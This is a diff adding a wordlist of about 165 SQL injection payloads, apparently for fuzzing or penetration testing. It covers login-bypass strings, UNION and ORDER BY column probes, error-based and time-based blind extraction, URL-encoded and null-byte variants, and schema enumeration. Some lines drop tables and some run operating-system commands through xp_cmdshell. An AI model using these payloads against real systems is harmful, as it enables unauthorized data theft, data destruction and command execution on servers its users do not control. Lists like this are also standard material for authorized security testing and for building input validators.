@@ -1,0 +1,166 @@
+1' OR '1'='1
+1' OR 1=1--
+1" OR "1"="1
+1" OR 1=1--
+1' OR 'a'='a
+admin' --
+admin' #
+admin'/*
+' OR '1'='1' --
+' OR 1=1#
+' OR 1=1/*
+' OR '1'='1'/*
+' UNION SELECT null, null--
+' UNION SELECT 1, 2, 3--
+' UNION SELECT @@version, null--
+' UNION ALL SELECT null, null--
+' UNION ALL SELECT 1, 2, 3--
+' OR EXISTS(SELECT * FROM users)--
+1; DROP TABLE users;--
+1'; DROP TABLE users;--
+1; EXEC sp_msforeachtable 'DROP TABLE ?'--
+' OR '1'='1' WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+TESTING
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND BENCHMARK(10000000,MD5(1))--
+1 AND BENCHMARK(10000000,MD5(1))--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+1' ORDER BY 6--
+1' ORDER BY 7--
+1' ORDER BY 8--
+1' ORDER BY 9--
+1' ORDER BY 10--
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+' HAVING 1=1--
+' HAVING 1=2--
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))--
+' AND UPDATEXML(1, CONCAT(0x5c, (SELECT version())), 1)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
+1" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--
+' OR (SELECT CAST(@@version AS VARCHAR)) = '1'--
+' OR (SELECT CAST(user() AS VARCHAR)) = '1'--
+'; EXEC xp_cmdshell('dir');--
+'; EXEC xp_cmdshell('ping 127.0.0.1');--
+' OR '1' IN (SELECT 1)--
+' OR '1' IN (SELECT @@version)--
+1 AND 1=1
+1 AND 1=2
+1 AND 'a'='a'
+1 AND 'a'='b'
+1' AND '1'='1
+1' AND '1'='2
+1" AND "1"="1
+1" AND "1"="2
+(1) AND (1)=(1)
+(1) AND (1)=(2)
+((1)) AND ((1))=((1))
+((1)) AND ((1))=((2))
+1 OR 1=1
+1 OR 1=2
+1' OR '1'='1
+1' OR '1'='2
+1" OR "1"="1
+1" OR "1"="2
+(1) OR (1)=(1)
+(1) OR (1)=(2)
+((1)) OR ((1))=((1))
+((1)) OR ((1))=((2))
+1 /*!AND*/ 1=1
+1 /*!OR*/ 1=1
+1' /*!AND*/ '1'='1
+1' /*!OR*/ '1'='1
+1" /*!AND*/ "1"="1
+1" /*!OR*/ "1"="1
+%27%20OR%20%271%27%3D%271
+%27%20OR%201%3D1--
+%22%20OR%20%221%22%3D%221
+%22%20OR%201%3D1--
+%27%20UNION%20SELECT%20null%2C%20null--
+%27%20UNION%20SELECT%201%2C%202%2C%203--
+%27%20AND%20SLEEP%285%29--
+admin%27%20--
+admin%27%20%23
+admin%27%2F%2A
+' OR '1'='1' %00
+' OR 1=1 %00
+1' OR '1'='1' %00
+1' OR 1=1 %00
+" OR "1"="1" %00
+" OR 1=1 %00
+1" OR "1"="1" %00
+1" OR 1=1 %00
+' || '1'='1
+' || 1=1--
+1' || '1'='1
+1' || 1=1--
+" || "1"="1
+" || 1=1--
+1" || "1"="1
+1" || 1=1--
+' OR '1'='1' || '
+' OR 1=1 || '
+1' OR '1'='1' || '
+1' OR 1=1 || '
+" OR "1"="1" || "
+" OR 1=1 || "
+1" OR "1"="1" || "
+1" OR 1=1 || "
+' AND '1'='1
+' AND 1=1--
+1' AND '1'='1
+1' AND 1=1--
+" AND "1"="1
+" AND 1=1--
+1" AND "1"="1
+1" AND 1=1--
+' AND '1'='1' || '
+' AND 1=1 || '
+1' AND '1'='1' || '
+1' AND 1=1 || '
+" AND "1"="1" || "
+" AND 1=1 || "
+1" AND "1"="1" || "
+1" AND 1=1 || "
+' OR '1'='1' /*
+' OR 1=1 /*
+1' OR '1'='1' /*
+1' OR 1=1 /*
+" OR "1"="1" /*
+" OR 1=1 /*
+1" OR "1"="1" /*
+1" OR 1=1 /*
+' AND '1'='1' /*
+' AND 1=1 /*
+1' AND '1'='1' /*
+1' AND 1=1 /*
+" AND "1"="1" /*
+" AND 1=1 /*
+1" AND "1"="1" /*
+1" AND 1=1 /*
+'; SELECT * FROM users--
+'; SELECT * FROM information_schema.tables--
+'; SELECT * FROM user_tables--
+'; SELECT * FROM pg_tables--
+'; SELECT * FROM sqlite_master--
+'; SELECT * FROM sys.tables--
+'; SELECT @@version--
+'; SELECT version()--
+'; SELECT v$version--
+'; SELECT user()--
+'; SELECT current_user--
+'; SELECT user_name()--
+'; SELECT database()--
+'; SELECT current_database()--
+'; SELECT db_name()--
+'; SELECT system_user()--
+'; SELECT @@servername--
+'; SELECT host_name()--
